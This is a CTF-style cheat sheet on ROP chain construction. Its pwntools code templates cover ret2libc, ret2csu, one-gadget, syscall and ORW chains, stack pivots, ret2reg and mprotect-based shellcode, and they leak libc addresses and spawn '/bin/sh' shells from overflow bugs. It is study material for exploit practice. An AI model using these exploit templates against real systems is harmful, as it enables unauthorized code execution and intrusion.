# ROP Chain Construction

## Gadget Finding

```bash
ROPgadget --binary ./binary                  # all gadgets
ROPgadget --binary ./binary --ropchain       # auto-generate chain
ropper --file ./binary --search "pop rdi"    # specific gadget
one_gadget ./libc.so.6                       # one-shot RCE
```

## ret2libc (Leak → Shell)

The most common CTF exploit pattern. Two stages: leak a libc
address, then call `system("/bin/sh")`.

```python
from pwn import *
context.binary = elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

p = process('./binary')

# Stage 1: Leak libc address via puts(GOT[puts])
rop.puts(elf.got['puts'])
rop.call(elf.sym['main'])  # return to main for stage 2

payload = b'A' * offset + rop.chain()
p.sendline(payload)

# Parse leak
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
log.info(f"libc base: {hex(libc.address)}")

# Stage 2: system("/bin/sh")
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh\x00')))

payload2 = b'A' * offset + rop2.chain()
p.sendline(payload2)
p.interactive()
```

## ret2csu

**When**: Binary has limited gadgets but links against libc
(has `__libc_csu_init`).

**How**: `__libc_csu_init` contains two useful gadget sequences
that together allow calling any function with controlled rdi, rsi, rdx.

```python
# Gadget 1 (at csu_init + offset): pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
# Gadget 2 (at csu_init + offset): mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15 + rbx*8]

def csu_call(func_got, rdi, rsi, rdx, gadget1, gadget2):
    payload = p64(gadget1)
    payload += p64(0)       # rbx = 0
    payload += p64(1)       # rbp = 1 (rbx+1 check)
    payload += p64(rdi)     # r12 → edi
    payload += p64(rsi)     # r13 → rsi
    payload += p64(rdx)     # r14 → rdx
    payload += p64(func_got)  # r15 (call [r15 + rbx*8])
    payload += p64(gadget2)
    payload += b'\x00' * 56   # padding for the 7 pops after call
    return payload
```

## One-Gadget

**When**: A single address in libc that spawns a shell under
certain register/stack constraints.

```bash
one_gadget ./libc.so.6
# Output:
# 0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
```

```python
one_gadget_offset = 0x4f2a5
payload = b'A' * offset + p64(libc.address + one_gadget_offset)
```

**Gotchas**: Constraints may not be satisfied. Try all one-gadgets,
or set up registers to meet constraints before jumping.

## Syscall ROP

**When**: No libc leak or libc functions unavailable (static binary,
stripped, or seccomp blocks `execve` but allows `open`/`read`/`write`).

```python
# execve("/bin/sh", NULL, NULL) via syscall
# rax = 59 (execve)
# rdi = pointer to "/bin/sh"
# rsi = 0 (argv = NULL)
# rdx = 0 (envp = NULL)

rop = ROP(elf)
binsh = next(elf.search(b'/bin/sh\x00'))  # or write it to BSS
rop.raw(pop_rax_ret)
rop.raw(59)
rop.raw(pop_rdi_ret)
rop.raw(binsh)
rop.raw(pop_rsi_ret)
rop.raw(0)
rop.raw(pop_rdx_ret)
rop.raw(0)
rop.raw(syscall_ret)
```

### ORW (Open-Read-Write) Chain

When `execve` is blocked by seccomp:

```python
# open("flag.txt", O_RDONLY) → read(fd, buf, size) → write(1, buf, size)
rop.call('open', [flag_str_addr, 0])        # rax = fd
rop.call('read', [3, buf_addr, 0x100])      # fd=3 (usually)
rop.call('write', [1, buf_addr, 0x100])     # stdout
```

## rdx Control

Many binaries lack a clean `pop rdx; ret` gadget.

**Alternatives**:
- `__libc_csu_init` (ret2csu) — controls rdx via r14
- `pop rdx; pop r12; ret` (sometimes in libc)
- Call a function that sets rdx as a side effect
  (e.g., `printf` often leaves rdx pointing to a large value)
- Use `ret2csu` or `SROP` for full register control

## GOT Overwrite

**When**: Partial RELRO — GOT is writable.

```python
# Overwrite puts@GOT with system, then call puts("/bin/sh")
# which actually calls system("/bin/sh")
elf.got['puts']  # address to overwrite
```

## Stack Pivot

**When**: Overflow is too short for a full ROP chain but you
control data elsewhere (heap, BSS, data segment).

```python
# pivot: overwrite RBP to point to controlled buffer,
# then `leave; ret` moves RSP to that buffer
# leave = mov rsp, rbp; pop rbp
# ret = pop rip

pivot_addr = ...  # address of controlled data
payload = b'A' * (offset - 8) + p64(pivot_addr) + p64(leave_ret)
# After leave;ret: RSP = pivot_addr + 8, execution continues from there
```

Also: `xchg rax, esp; ret` if rax points to controlled memory.

## ret2plt
**When**: Need to call a libc function (e.g., `puts`, `printf`) but don't have a libc leak yet. The PLT stub resolves the function address at runtime.
```python
# IN: elf, offset  OUT: leak via puts@plt(puts@got)
from pwn import *
context.binary = elf = ELF('./binary')
rop = ROP(elf)
rop.call(elf.plt['puts'], [elf.got['puts']])  # puts@plt prints puts@got address
rop.call(elf.sym['main'])                      # return to main for stage 2
p.sendline(b'A' * offset + rop.chain())
leak = u64(p.recvline()[:6].ljust(8, b'\x00'))
```
**Trap**: ret2plt only works for functions the binary already imports. Check `elf.plt` for available stubs.

## ret2reg
**When**: A register (often RAX, RDI, or RSI) points to your controlled buffer at the point of `ret`. Jump to a `jmp rax` / `call rax` gadget to execute shellcode.
```python
# IN: register pointing to buffer, shellcode  OUT: shell
# Find: ROPgadget --binary ./binary | grep "jmp rax\|call rax"
jmp_rax = 0xADDR  # address of 'jmp rax' or 'call rax' gadget
payload = shellcode.ljust(offset, b'\x90') + p64(jmp_rax)
# RAX already points to start of payload (common after read/gets)
```
**Trap**: Verify which register holds your buffer with GDB. `call reg` pushes a return address (may misalign); `jmp reg` doesn't.

## mprotect + Read + Execute
**When**: NX is on, but you can ROP. Make a region RWX, read shellcode into it, jump there.
```python
# IN: elf, libc (leaked), offset  OUT: arbitrary shellcode execution
from pwn import *
rop = ROP(libc)
# Step 1: mprotect(page_addr, 0x1000, 7)  — 7 = PROT_READ|PROT_WRITE|PROT_EXEC
rop.call('mprotect', [rwx_addr & ~0xfff, 0x1000, 7])
# Step 2: read(0, rwx_addr, 0x200)  — read shellcode from stdin
rop.call('read', [0, rwx_addr, 0x200])
# Step 3: jump to shellcode
rop.raw(rwx_addr)
p.sendline(b'A' * offset + rop.chain())
sleep(0.1)
p.send(shellcode)  # stage 2: actual shellcode
p.interactive()
```
**Trap**: `page_addr` must be page-aligned (& ~0xfff). Use BSS or a known heap address as `rwx_addr`. Verify `mprotect` isn't blocked by seccomp.

## Pwntools Automation

```python
# Auto-ROP
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')
print(rop.dump())  # visualize chain

# With libc
rop = ROP([elf, libc])
rop.system(next(libc.search(b'/bin/sh\x00')))
```
